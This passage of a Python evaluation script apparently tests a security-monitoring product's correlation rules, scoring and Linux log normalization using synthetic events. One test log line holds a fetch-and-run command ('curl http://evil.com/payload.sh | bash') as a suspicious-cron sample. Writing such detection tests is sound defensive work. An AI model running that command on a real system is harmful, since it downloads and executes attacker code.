        "counts": {("ip:10.0.0.1", SHARED_SOURCE_IP.window_seconds): 2},
        "expected_rules": {"shared_source_ip"},
    },
    {
        "name": "TP: shared_dest_ip fires at 2 (outbound)",
        "payload": {"entities": [{"key": "ip:8.8.8.8", "direction": "outbound"}]},
        "counts": {("ip:8.8.8.8", SHARED_DEST_IP.window_seconds): 2},
        "expected_rules": {"shared_dest_ip"},
    },
    {
        "name": "TP: shared_domain fires at 2",
        "payload": {"entities": [{"key": "domain:evil.example.com"}]},
        "counts": {("domain:evil.example.com", SHARED_DOMAIN.window_seconds): 2},
        "expected_rules": {"shared_domain"},
    },
    {
        "name": "TP: same_user_multi_host fires at 2",
        "payload": {"entities": [{"key": "user:corp\\alice"}]},
        "counts": {("user:corp\\alice", SAME_USER_MULTI_HOST.window_seconds): 2},
        "expected_rules": {"same_user_multi_host"},
    },
    {
        "name": "TP: shared_file_hash fires at 2",
        "payload": {"entities": [{"key": "hash:sha256:deadbeef"}]},
        "counts": {("hash:sha256:deadbeef", SHARED_FILE_HASH.window_seconds): 2},
        "expected_rules": {"shared_file_hash"},
    },
    {
        "name": "TP: high_frequency_source fires at 10",
        "payload": {"correlation_id": _CID, "entities": []},
        "counts": {(f"cid:{_CID}", HIGH_FREQUENCY_SOURCE.window_seconds): 10},
        "expected_rules": {"high_frequency_source"},
    },
    {
        "name": "TP: attack chain -- burst + session + process_tree all fire",
        "payload": {
            "correlation_id": _CID,
            "session_id": _SID,
            "process_tree_id": _PTID,
            "entities": [],
        },
        "counts": {
            (f"cid:{_CID}", SAME_HOST_BURST.window_seconds): 5,
            (f"sid:{_SID}", SAME_LOGON_SESSION.window_seconds): 3,
            (f"ptid:{_PTID}", SAME_PROCESS_TREE.window_seconds): 2,
        },
        "expected_rules": {"same_host_burst", "same_logon_session", "same_process_tree"},
    },
    {
        "name": "TP: IOC spread -- file_hash + shared_source_ip",
        "payload": {
            "entities": [
                {"key": "hash:md5:cafebabe", "direction": ""},
                {"key": "ip:185.220.101.1", "direction": "inbound"},
            ]
        },
        "counts": {
            ("hash:md5:cafebabe", SHARED_FILE_HASH.window_seconds): 3,
            ("ip:185.220.101.1", SHARED_SOURCE_IP.window_seconds): 4,
        },
        "expected_rules": {"shared_file_hash", "shared_source_ip"},
    },
    # -- True Negatives ------------------------------------------------------
    {
        "name": "TN: burst below threshold (count=2, threshold=3) -> no fire",
        "payload": {"correlation_id": _CID, "entities": []},
        "counts": {(f"cid:{_CID}", SAME_HOST_BURST.window_seconds): 2},
        "expected_rules": set(),
        "forbidden_rules": {"same_host_burst"},
    },
    {
        "name": "TN: high_freq below threshold (count=9, threshold=10) -> no fire",
        "payload": {"correlation_id": _CID, "entities": []},
        "counts": {(f"cid:{_CID}", HIGH_FREQUENCY_SOURCE.window_seconds): 9},
        "expected_rules": set(),
        "forbidden_rules": {"high_frequency_source"},
    },
    {
        "name": "TN: empty context -> no rules fire",
        "payload": {
            "correlation_id": _CID,
            "session_id": _SID,
            "process_tree_id": _PTID,
            "entities": [],
        },
        "counts": {},
        "expected_rules": set(),
    },
    {
        "name": "TN: hash count=1 -> no shared_file_hash",
        "payload": {"entities": [{"key": "hash:md5:aabbccdd"}]},
        "counts": {("hash:md5:aabbccdd", SHARED_FILE_HASH.window_seconds): 1},
        "expected_rules": set(),
        "forbidden_rules": {"shared_file_hash"},
    },
    {
        "name": "TN: no IDs, no entities -> completely silent",
        "payload": {"entities": []},
        "counts": {},
        "expected_rules": set(),
    },
    # -- Scoring -------------------------------------------------------------
    {
        "name": "SCORE: no rules -> score=0, not significant",
        "payload": {"entities": []},
        "counts": {},
        "expected_score_min": 0,
        "expected_score_max": 0,
        "expected_significant": False,
    },
    {
        "name": "SCORE: same_host_burst only -> score=10, significant",
        "payload": {"correlation_id": _CID, "entities": []},
        "counts": {(f"cid:{_CID}", SAME_HOST_BURST.window_seconds): 3},
        "expected_score_min": 10,
        "expected_significant": True,
    },
    {
        "name": "SCORE: process_tree (20) + file_hash (18) -> score=38, LOW confidence (threshold=40)",
        "payload": {
            "process_tree_id": _PTID,
            "entities": [{"key": "hash:sha256:aabbccdd"}],
        },
        "counts": {
            (f"ptid:{_PTID}", SAME_PROCESS_TREE.window_seconds): 2,
            ("hash:sha256:aabbccdd", SHARED_FILE_HASH.window_seconds): 2,
        },
        "expected_score_min": 38,
        "expected_confidence": "low",
    },
    {
        "name": "SCORE: process_tree (20) + session (15) + user_multi_host (15) -> score=50, MEDIUM confidence",
        "payload": {
            "session_id": _SID,
            "process_tree_id": _PTID,
            "entities": [{"key": "user:corp\\attacker"}],
        },
        "counts": {
            (f"sid:{_SID}", SAME_LOGON_SESSION.window_seconds): 2,
            (f"ptid:{_PTID}", SAME_PROCESS_TREE.window_seconds): 2,
            ("user:corp\\attacker", SAME_USER_MULTI_HOST.window_seconds): 3,
        },
        "expected_score_min": 50,
        "expected_confidence": "medium",
    },
    {
        "name": "SCORE: process_tree (20) + file_hash (18) + session (15) + burst (10) -> score >= 63",
        "payload": {
            "correlation_id": _CID,
            "session_id": _SID,
            "process_tree_id": _PTID,
            "entities": [{"key": "hash:sha256:cafebabe"}],
        },
        "counts": {
            (f"cid:{_CID}", SAME_HOST_BURST.window_seconds): 4,
            (f"sid:{_SID}", SAME_LOGON_SESSION.window_seconds): 3,
            (f"ptid:{_PTID}", SAME_PROCESS_TREE.window_seconds): 2,
            ("hash:sha256:cafebabe", SHARED_FILE_HASH.window_seconds): 5,
        },
        "expected_score_min": 63,
    },
    {
        "name": "SCORE: score capped at 100 even if weights exceed it",
        "payload": {
            "correlation_id": _CID,
            "session_id": _SID,
            "process_tree_id": _PTID,
            "event_chain_id": _ECID,
            "entities": [
                {"key": "hash:sha256:ffffffff"},
                {"key": "user:corp\\evil"},
            ],
        },
        "counts": {
            (f"cid:{_CID}", SAME_HOST_BURST.window_seconds): 10,
            (f"cid:{_CID}", HIGH_FREQUENCY_SOURCE.window_seconds): 15,
            (f"sid:{_SID}", SAME_LOGON_SESSION.window_seconds): 5,
            (f"ptid:{_PTID}", SAME_PROCESS_TREE.window_seconds): 3,
            (f"ecid:{_ECID}", SAME_EVENT_CHAIN.window_seconds): 4,
            ("hash:sha256:ffffffff", SHARED_FILE_HASH.window_seconds): 3,
            ("user:corp\\evil", SAME_USER_MULTI_HOST.window_seconds): 2,
        },
        "expected_score_max": 100,
    },
]


def run_correlation_tests() -> dict[str, Any]:
    print("\n" + "=" * 62)
    print("  4. CORRELATION ENGINE ACCURACY")
    print("=" * 62)

    rule_m = ClassificationMetrics()
    score_total = 0
    score_correct = 0

    for case in CORRELATION_TEST_CASES:
        ctx = GroupContext(window_counts=case["counts"])
        match_result = match_event(case["payload"], ctx)
        score_result = score_match(match_result)
        fired = {r.rule.name for r in match_result.matched_rules}

        errors: list[str] = []

        for rule in case.get("expected_rules", set()):
            if rule in fired:
                rule_m.tp += 1
            else:
                rule_m.fn += 1
                errors.append(f"MISS: '{rule}' should have fired")

        for rule in case.get("forbidden_rules", set()):
            if rule not in fired:
                rule_m.tn += 1
            else:
                rule_m.fp += 1
                errors.append(f"FALSE POSITIVE: '{rule}' fired but should not")

        if "expected_score_min" in case:
            score_total += 1
            if score_result.score >= case["expected_score_min"]:
                score_correct += 1
            else:
                errors.append(f"SCORE: got {score_result.score}, expected >= {case['expected_score_min']}")

        if "expected_score_max" in case:
            score_total += 1
            if score_result.score <= case["expected_score_max"]:
                score_correct += 1
            else:
                errors.append(f"SCORE: got {score_result.score}, expected <= {case['expected_score_max']}")

        if "expected_significant" in case:
            score_total += 1
            if score_result.is_significant == case["expected_significant"]:
                score_correct += 1
            else:
                errors.append(f"SIGNIFICANT: got {score_result.is_significant}, expected {case['expected_significant']}")

        if "expected_confidence" in case:
            score_total += 1
            if score_result.confidence == case["expected_confidence"]:
                score_correct += 1
            else:
                errors.append(f"CONFIDENCE: got {score_result.confidence!r}, expected {case['expected_confidence']!r}")

        ok = not errors
        print(
            f"  [{'OK' if ok else 'XX'}] {case['name']}"
            f"  -> rules={sorted(fired)} score={score_result.score} conf={score_result.confidence}"
        )
        for e in errors:
            print(f"        FAIL -> {e}")

    print(f"\n  Rule detection: TP={rule_m.tp} FP={rule_m.fp} TN={rule_m.tn} FN={rule_m.fn}")
    print(f"  Precision: {rule_m.precision:.1%}")
    print(f"  Recall:    {rule_m.recall:.1%}")
    print(f"  F1:        {rule_m.f1:.1%}")
    if score_total > 0:
        print(f"  Score tests: {score_correct}/{score_total} = {score_correct / score_total:.1%}")

    return {
        "precision": rule_m.precision,
        "recall": rule_m.recall,
        "f1": rule_m.f1,
        "accuracy": rule_m.accuracy,
        "score_accuracy": score_correct / score_total if score_total else None,
    }


# ===============================================================================
# 1b. LINUX NORMALIZATION
# ===============================================================================

def _make_linux_base(hostname: str = "ubuntu-prod") -> NormalizedEvent:
    return NormalizedEvent(
        event_id="eval-linux-001",
        timestamp=datetime.now(tz=timezone.utc),
        hostname=hostname,
        os_type="linux",
        agent_id="agent-linux-eval",
        tenant_id="tenant-eval",
    )


LINUX_NORM_TEST_CASES: list[dict] = [
    # ── sshd — successful password auth ──────────────────────────────────────
    {
        "name": "sshd Accepted password -> auth, outcome=success, user+IP extracted",
        "raw": {
            "program": "sshd",
            "message": "Accepted password for alice from 203.0.113.5 port 55200 ssh2",
        },
        "expected": {
            "category": "auth",
            "user.name": "alice",
            "network.src_ip": "203.0.113.5",
            "network.src_port": 55200,
            "raw.outcome": "success",
            "raw.auth_method": "password",
        },
    },
    # ── sshd — failed password auth ──────────────────────────────────────────
    {
        "name": "sshd Failed password -> auth, outcome=failure, sev>=2",
        "raw": {
            "program": "sshd",
            "message": "Failed password for bob from 198.51.100.7 port 12345 ssh2",
        },
        "expected": {
            "category": "auth",
            "user.name": "bob",
            "network.src_ip": "198.51.100.7",
            "raw.outcome": "failure",
        },
        "expected_min": {"severity": 2},
    },
    # ── sshd — invalid user ───────────────────────────────────────────────────
    {
        "name": "sshd Invalid user -> auth, invalid_user=True, sev>=2",
        "raw": {
            "program": "sshd",
            "message": "Invalid user charlie from 10.0.0.99",
        },
        "expected": {
            "category": "auth",
            "user.name": "charlie",
            "network.src_ip": "10.0.0.99",
            "raw.outcome": "failure",
            "raw.invalid_user": True,
        },
        "expected_min": {"severity": 2},
    },
    # ── sshd — session open ───────────────────────────────────────────────────
    {
        "name": "sshd session opened -> auth, user extracted",
        "raw": {
            "program": "sshd",
            "message": "pam_unix(sshd:session): session opened for user dave by (uid=0)",
        },
        "expected": {
            "category": "auth",
        },
    },
    # ── sshd — publickey auth ─────────────────────────────────────────────────
    {
        "name": "sshd Accepted publickey -> auth_method=publickey",
        "raw": {
            "program": "sshd",
            "message": "Accepted publickey for deploy from 172.16.0.10 port 50001 ssh2",
        },
        "expected": {
            "category": "auth",
            "user.name": "deploy",
            "network.src_ip": "172.16.0.10",
            "raw.outcome": "success",
            "raw.auth_method": "publickey",
        },
    },
    # ── sudo — privileged command ─────────────────────────────────────────────
    {
        "name": "sudo command execution -> auth, outcome=success, cmd in process",
        "raw": {
            "program": "sudo",
            "message": "alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update",
        },
        "expected": {
            "category": "auth",
            "user.name": "alice",
            "user.is_privileged": True,
            "process.command_line": "/usr/bin/apt update",
            "raw.outcome": "success",
            "raw.sudo_run_as": "root",
        },
        "expected_min": {"severity": 2},
    },
    # ── sudo — shell escalation (higher severity) ─────────────────────────────
    {
        "name": "sudo bash escalation -> sev>=3 (interactive shell)",
        "raw": {
            "program": "sudo",
            "message": "bob : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/bin/bash",
        },
        "expected": {
            "category": "auth",
            "user.name": "bob",
            "raw.outcome": "success",
        },
        "expected_min": {"severity": 3},
    },
    # ── sudo — auth failure ───────────────────────────────────────────────────
    {
        "name": "sudo authentication failure -> outcome=failure",
        "raw": {
            "program": "sudo",
            "message": "alice : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/su",
        },
        "expected": {
            "category": "auth",
        },
        "expected_min": {"severity": 2},
    },
    # ── cron — CMD execution ──────────────────────────────────────────────────
    {
        "name": "cron CMD execution -> process, user+cmd extracted",
        "raw": {
            "program": "cron",
            "message": "(root) CMD (/usr/local/bin/backup.sh)",
        },
        "expected": {
            "category": "process",
            "user.name": "root",
            "user.is_privileged": True,
            "process.command_line": "/usr/local/bin/backup.sh",
            "raw.action": "cron_cmd",
        },
    },
    # ── cron — suspicious cmd (network call inside cron) ─────────────────────
    {
        "name": "cron CMD with curl -> sev>=3 (suspicious network call)",
        "raw": {
            "program": "cron",
            "message": "(alice) CMD (curl http://evil.com/payload.sh | bash)",
        },
        "expected": {
            "category": "process",
            "user.name": "alice",
        },
        "expected_min": {"severity": 3},
    },
    # ── kernel module ─────────────────────────────────────────────────────────
    {
        "name": "insmod -> process, sev>=3, action=kernel_module_load",
        "raw": {
            "program": "insmod",
            "message": "Loading module mydriver.ko",
        },
        "expected": {
            "category": "process",
            "raw.action": "kernel_module_load",
        },
        "expected_min": {"severity": 3},
    },
    # ── useradd ───────────────────────────────────────────────────────────────
    {
        "name": "useradd -> auth, sev>=2, action=account_created",
        "raw": {
            "program": "useradd",
            "message": "new user: name=mallory, UID=1005, GID=1005, home=/home/mallory",
        },
        "expected": {
            "category": "auth",
            "user.name": "mallory",
            "raw.action": "account_created",
        },
        "expected_min": {"severity": 2},
    },
    # ── syslog severity mapping ───────────────────────────────────────────────
    {
        "name": "syslog_severity=crit -> sev=4",
        "raw": {
            "program": "kernel",
            "syslog_severity": "crit",
            "message": "kernel panic - not syncing",
        },
        "expected": {
            "category": "other",
        },
        "expected_min": {"severity": 4},
    },
    # ── auditd execve ─────────────────────────────────────────────────────────
    {
        "name": "auditd execve -> process.name + executable extracted",
        "raw": {
            "syscall": "execve",
            "exe": "/usr/bin/python3",
            "a0": "/usr/bin/python3",
            "a1": "exploit.py",
            "pid": "4321",
            "ppid": "1234",
            "uid": "0",
        },
        "expected": {
            "category": "process",
            "process.name": "python3",
            "process.executable": "/usr/bin/python3",
        },
    },
    # ── auditd setuid ─────────────────────────────────────────────────────────
    {
        "name": "auditd setuid (failed) -> auth, outcome=failure, sev>=2",
        "raw": {
            "syscall": "setuid",
            "res": "failed",
            "uid": "1001",
        },
        "expected": {
            "category": "auth",
            "raw.outcome": "failure",
        },
        "expected_min": {"severity": 2},
    },
    # ── structured user sub-dict (agent format) ───────────────────────────────
    {
        "name": "structured user dict -> name preferred over uid",
        "raw": {
            "program": "sshd",
            "message": "Accepted password for svcacct from 10.1.2.3 port 22100 ssh2",
            "user": {"name": "svcacct", "id": "1050"},
        },
        "expected": {
            "user.name": "svcacct",
            "user.id": "1050",
        },
    },
]


def run_linux_normalization_tests() -> dict[str, Any]:
    print("\n" + "=" * 62)
    print("  1b. LINUX LOG NORMALIZATION ACCURACY")
    print("=" * 62)

    total_fields = 0
    correct_fields = 0

    for case in LINUX_NORM_TEST_CASES:
        base = _make_linux_base()
        result = normalize_linux_event(case["raw"], base)
        errors: list[str] = []

        for path, expected_val in case.get("expected", {}).items():
            actual = _get_nested(result, path)
            total_fields += 1
            if actual == expected_val:
                correct_fields += 1
            else:
                errors.append(f"{path}: expected={expected_val!r}, got={actual!r}")

        for path, min_val in case.get("expected_min", {}).items():
            actual = _get_nested(result, path)
            total_fields += 1
            if actual is not None and actual >= min_val:
                correct_fields += 1
            else:
                errors.append(f"{path}: expected>={min_val!r}, got={actual!r}")

        status = "OK" if not errors else "XX"
        print(f"  [{status}] {case['name']}")
        for e in errors:
            print(f"        FAIL -> {e}")

    accuracy = correct_fields / total_fields if total_fields else 0.0
    print(f"\n  Field accuracy: {correct_fields}/{total_fields} = {accuracy:.1%}")
    return {"field_accuracy": accuracy, "total": total_fields, "correct": correct_fields}


# ===============================================================================
# MAIN
# ===============================================================================

async def main() -> None:
    parser = argparse.ArgumentParser(description="SOC SaaS v2 accuracy evaluation")
    parser.add_argument("--skip-ai", action="store_true", help="Skip live LLM API calls (no API keys needed)")
    args = parser.parse_args()

    print("\n" + "#" * 62)
    print("  SOC SaaS v2 -- Accuracy Evaluation Report")
    print("  " + datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    print("#" * 62)

    norm      = run_normalization_tests()
    norm_linux = run_linux_normalization_tests()
    det       = run_detection_tests()
    ai_parse  = run_ai_parse_tests()

    if args.skip_ai:
        ai_live: dict[str, Any] = {"live_accuracy": None, "skipped": True}
        print("\n  [3b AI Live] SKIPPED (--skip-ai flag)")
    else:
        ai_live = await run_ai_live_tests()

    corr = run_correlation_tests()

    # -- Final summary ---------------------------------------------------------
    print("\n" + "#" * 62)
    print("  SUMMARY")
    print("#" * 62)
    print(f"  1a. Windows Normalization field accuracy : {norm['field_accuracy']:.1%}  ({norm['correct']}/{norm['total']} fields)")
    print(f"  1b. Linux Normalization   field accuracy : {norm_linux['field_accuracy']:.1%}  ({norm_linux['correct']}/{norm_linux['total']} fields)")
    print(f"  2. Detection Engine      F1={det['f1']:.1%}  Precision={det['precision']:.1%}  Recall={det['recall']:.1%}  Accuracy={det['accuracy']:.1%}")
    print(f"  3a. AI Parse Accuracy    {ai_parse['parse_accuracy']:.1%}")
    if ai_live.get("skipped"):
        print("  3b. AI Live Accuracy     SKIPPED -- run without --skip-ai to test")
    elif ai_live.get("live_accuracy") is None:
        print("  3b. AI Live Accuracy     SKIPPED -- no API keys in .env")
    else:
        print(
            f"  3b. AI Live Accuracy     {ai_live['live_accuracy']:.1%}"
            f"  (sev={ai_live.get('severity_accuracy', 0):.1%}  action={ai_live.get('action_accuracy', 0):.1%})"
        )
    print(f"  4. Correlation Engine    F1={corr['f1']:.1%}  Precision={corr['precision']:.1%}  Recall={corr['recall']:.1%}")
    if corr.get("score_accuracy") is not None:
        print(f"     Scoring accuracy :    {corr['score_accuracy']:.1%}")
    print()


if __name__ == "__main__":
    asyncio.run(main())
